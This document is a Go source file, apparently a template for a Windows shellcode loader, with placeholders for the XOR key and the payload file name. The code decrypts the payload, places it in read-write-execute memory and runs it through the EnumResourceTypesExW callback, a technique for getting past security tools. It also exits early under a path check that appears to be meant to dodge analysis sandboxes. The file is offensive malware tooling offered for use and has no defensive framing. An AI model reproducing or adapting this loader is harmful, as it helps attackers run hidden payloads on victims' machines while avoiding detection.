package main

import (
	"os"
	"syscall"
	"unsafe"
)

var (
	timer int
	dummy [522]byte
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	NULL                   = 0
	RESOURCE_ENUM_VALIDATE = 0x0008
)

var (
	kernel32             = syscall.NewLazyDLL("kernel32.dll")
	ntdll                = syscall.NewLazyDLL("ntdll.dll")
	VirtualAlloc         = kernel32.NewProc("VirtualAlloc")
	LoadLibraryW         = kernel32.NewProc("LoadLibraryW")
	EnumResourceTypesExW = kernel32.NewProc("EnumResourceTypesExW")
	RtlMoveMemory        = ntdll.NewProc("RtlMoveMemory")
)

func Callback(shellcode []byte) {
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	p1, _ := syscall.UTF16PtrFromString("Kernel32.dll")
	dll1, _, _ := LoadLibraryW.Call(uintptr(unsafe.Pointer(p1)))
	EnumResourceTypesExW.Call(dll1, addr, NULL, RESOURCE_ENUM_VALIDATE, NULL)
}

func XorDecrypt(plaintext []byte, key []byte) []byte {
	ciphertext := make([]byte, len(plaintext))
	keyLength := len(key)
	for i, byte := range plaintext {
		keyByte := key[i%keyLength]
		encryptedByte := byte ^ keyByte
		ciphertext[i] = encryptedByte
	}
	return ciphertext
}

func DecryptData(shellcode []byte) []byte {
	key := []byte{{{Key}}}
	decryptShellcode := XorDecrypt(shellcode, key)
	return decryptShellcode
}

func main() {
	args := os.Args[0]
	if args[10] == 92 && (args[0] == 99 || args[0] == 67) {
		os.Exit(0)
	}

	ciphertext, err := os.ReadFile("{{LOCAL_FILENAME}}")
	if err != nil {
		return
	}
	byteData := DecryptData(ciphertext)
	Callback(byteData)
}
